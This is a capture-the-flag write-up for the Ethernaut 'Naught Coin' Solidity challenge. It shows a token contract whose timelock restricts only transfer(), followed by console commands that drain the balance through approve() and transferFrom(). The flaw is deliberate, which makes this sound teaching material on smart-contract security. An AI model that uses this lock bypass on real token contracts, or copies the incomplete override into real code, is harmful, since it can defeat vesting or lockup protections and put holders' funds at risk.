# Naught Coin

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

```solidity
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol';

 contract NaughtCoin is StandardToken {

  string public constant name = 'NaughtCoin';
  string public constant symbol = '0x0';
  uint public constant decimals = 18;
  uint public timeLock = now + 10 years;
  uint public INITIAL_SUPPLY = 1000000 * (10 ** decimals);
  address public player;

  function NaughtCoin(address _player) public {
    player = _player;
    totalSupply_ = INITIAL_SUPPLY;
    balances[player] = INITIAL_SUPPLY;
    Transfer(0x0, player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) lockTokens public returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  }
}
```

## Solution

The NaughtCoin contract doesn't properly implement ERC20. We can take advantage of this by using different methods of transfer.

1. Check the exact amount of available NaughtCoins with `await contract.balanceOf('0xFe8070fD6766868a66773A13035a1Cb4DF79A1E0')`
2. [Approve a spender (myself) to withdraw from my account](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md#approve) with `await contract.approve('0xFe8070fD6766868a66773A13035a1Cb4DF79A1E0', '1e24')`
3. Snatch up all the NaughtCoins with `await contract.transferFrom('0xFe8070fD6766868a66773A13035a1Cb4DF79A1E0', '0xB2047B8131232BE59a6CBF4947BB03550f408b45', '1e+24')`
